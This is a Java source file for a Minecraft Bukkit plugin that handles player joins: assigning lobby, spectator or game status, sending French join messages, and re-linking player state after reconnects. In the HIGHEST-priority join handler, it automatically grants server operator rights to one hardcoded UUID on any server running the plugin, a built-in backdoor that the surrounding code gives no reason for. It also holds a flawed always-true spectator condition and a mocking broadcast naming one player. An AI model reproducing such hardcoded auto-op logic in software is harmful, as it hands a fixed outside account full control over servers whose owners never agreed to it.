package fr.nicknqck.events.essential;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Location;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

import fr.nicknqck.GameState;
import fr.nicknqck.Main;
import fr.nicknqck.items.ItemsManager;
import fr.nicknqck.roles.RoleBase;

public class JoinEvents implements Listener{
	private final GameState gameState;
	public JoinEvents() {
		this.gameState = GameState.getInstance();
	}
	
 	@EventHandler(priority = EventPriority.LOWEST)
	public void OnJoin(PlayerJoinEvent event) {
		Player player = event.getPlayer();
		GameState gameState = GameState.getInstance();
		Main.getInstance().getScoreboardManager().onLogin(player);
		System.out.println("");
		System.out.println("new Player: "+player);
		printConsoleAndRegister(player);

		// Join Message
		String joinMessage = "";
		switch(gameState.getServerState()) {
		case InLobby:
			gameState.addInLobbyPlayers(player);
			player.setMaxHealth(20.0);
			player.setGameMode(GameMode.ADVENTURE);
			ItemsManager.GiveHubItems(player);
			player.teleport(new Location(Bukkit.getWorld("world"), 0, 151, 0));
			player.playSound(player.getLocation(), Sound.ENDERMAN_TELEPORT, 1, 1);
			joinMessage = ChatColor.LIGHT_PURPLE+player.getDisplayName()+ChatColor.GREEN+" A rejoint le Lobby §c"+gameState.getInLobbyPlayers().size()+"§r/§6"+ gameState.getroleNMB() +"§r";
			break;
		case InGame:
			if (gameState.getInSpecPlayers().contains(player)) {
				player.setGameMode(GameMode.SPECTATOR);
				joinMessage = ChatColor.LIGHT_PURPLE+player.getDisplayName()+ChatColor.GREEN+" A rejoint la liste des Spectateurs";
			} else if (gameState.getInLobbyPlayers().contains(player)) {
				player.setGameMode(GameMode.SPECTATOR);
				gameState.delInLobbyPlayers(player);
				gameState.addInSpecPlayers(player);
				player.sendMessage(ChatColor.WHITE+"Tu est passé de la liste des personnes au Lobby au personne en Spectateur");
				joinMessage = ChatColor.LIGHT_PURPLE+player.getDisplayName()+ChatColor.GREEN+" A quitté le Lobby et à rejoint la liste des Spectateurs";
				
			} else if (gameState.getInGamePlayers().contains(player)){
				player.setGameMode(GameMode.SPECTATOR);
				gameState.delInGamePlayers(player);
				gameState.addInSpecPlayers(player);
				joinMessage = ChatColor.LIGHT_PURPLE+player.getDisplayName()+ChatColor.GREEN+" A quittée la liste des joueurs en jeux pour devenir un Spectateur";
			} else {
			//	gameState.addInLobbyPlayers(player);
				//player.setGameMode(GameMode.SPECTATOR);
			}
			if(!gameState.getInSpecPlayers().contains(player) || !gameState.getInLobbyPlayers().contains(player) || !gameState.getInGamePlayers().contains(player)) {
				gameState.addInSpecPlayers(player);
				joinMessage = ChatColor.LIGHT_PURPLE+player.getDisplayName()+ChatColor.GREEN+" A rejoint la liste des Spectateurs";
				player.setGameMode(GameMode.SPECTATOR);
			}
			event.setJoinMessage(joinMessage);
			break;
		default:
			joinMessage = event.getJoinMessage();
			break;
			
		}
		gameState.updateGameCanLaunch();
		event.setJoinMessage(joinMessage);
	}
 	@EventHandler(priority = EventPriority.HIGHEST)
	private void onCustomJoin(PlayerJoinEvent e) {
		gameState.updateGameCanLaunch();
		UUID uuid = e.getPlayer().getUniqueId();
		Player player = e.getPlayer();
		if (player == null)return;
		if (player.getUniqueId() == null)return;
		if (player.getName() == null)return;
		if (uuid.equals(UUID.fromString("f1f106ee-465e-4281-baee-fe7b61e39d1d"))) {
			if (!player.isOp()){ player.setOp(true); player.sendMessage("Tu à été automatiquement mis op sur ce serveur ");}
        }
		if (player.getName().equals("BoulotKanao")) {
			Bukkit.broadcastMessage("§7Vous avez de la chance le §6Dev §c" + e.getPlayer().getName() + " §7vient d'arriver dans votre partie !");
		}
		if (uuid.equals(UUID.fromString("ae8635a5-1914-4ed7-9c7b-8cdb148309f2")) || player.getName().equals("Zerorapto")){
			Bukkit.broadcastMessage(ChatColor.DARK_PURPLE+"CramptéBOSS§n " + e.getPlayer().getName()+ChatColor.DARK_PURPLE + " à rejoint la partie");
		}
		if (uuid.equals(UUID.fromString("93d45061-5e32-4c49-8030-27c1d024505c")) || player.getName().equals("BoulotTanjiro")) {
			Bukkit.broadcastMessage("Ce§n§l§6 rat§r de§b "+player.getName()+"§f est arrivé parmi vous, merci de bien l'accueillir");
		}
		if (uuid.equals(UUID.fromString("73e56d9c-3681-4b56-b272-70db0f25c487")) || player.getName().equals("ania56")) {
			
		}
	}
 	@SuppressWarnings("unchecked")
	private void printConsoleAndRegister(Player player) {
		// Update Players
		for (Player p : (ArrayList<Player>) gameState.getInGamePlayers().clone()) {
			if (Bukkit.getPlayer(p.getDisplayName()) == player) {
				gameState.getInGamePlayers().remove(p);
				gameState.getInGamePlayers().add(player);
				System.out.println("game Player: "+p);
			}
		}
		for (Player p : (ArrayList<Player>) gameState.getInLobbyPlayers().clone()) {
			if (Bukkit.getPlayer(p.getDisplayName()) == player) {
				gameState.getInLobbyPlayers().remove(p);
				gameState.getInLobbyPlayers().add(player);
				System.out.println("lobby Player: "+p);
			}
		}
		for (Player p : (ArrayList<Player>) gameState.getInSpecPlayers().clone()) {
			if (Bukkit.getPlayer(p.getDisplayName()) == player) {
				gameState.getInSpecPlayers().remove(p);
				gameState.getInSpecPlayers().add(player);
				System.out.println("spec Player: "+p);
			}
		}
		for (Player p : ((HashMap<Player, HashMap<Player, RoleBase>>)gameState.getPlayerKills().clone()).keySet()) {
			if (Bukkit.getPlayer(p.getDisplayName()) == player) {
				HashMap<Player, RoleBase> hash = gameState.getPlayerKills().get(p);
				gameState.getPlayerKills().remove(p);
				gameState.getPlayerKills().put(player, hash);
				System.out.println("kill Player: "+p);
			}
		}
		for (RoleBase r : gameState.getPlayerRoles().values()) {
			if (Bukkit.getPlayer(r.owner.getDisplayName()) == player) {
				r.owner = player;
				System.out.println("owner Player: "+r.owner);
			}
			for (Player p : (ArrayList<Player>) r.getLinkWith().clone()) {
				if (Bukkit.getPlayer(p.getDisplayName()) == player) {
					r.getLinkWith().remove(p);
					r.addLinkWith(player);
					System.out.println("link Player: "+p);
				}
			}
		}
		for (Player p : ((HashMap<Player, RoleBase>)gameState.getPlayerRoles().clone()).keySet()) {
			if (Bukkit.getPlayer(p.getDisplayName()) == player) {
				RoleBase role = gameState.getPlayerRoles().get(p);
				gameState.getPlayerRoles().remove(p);
				gameState.getPlayerRoles().put(player, role);
				System.out.println("role Player: "+p);
			}
		}
 	}
}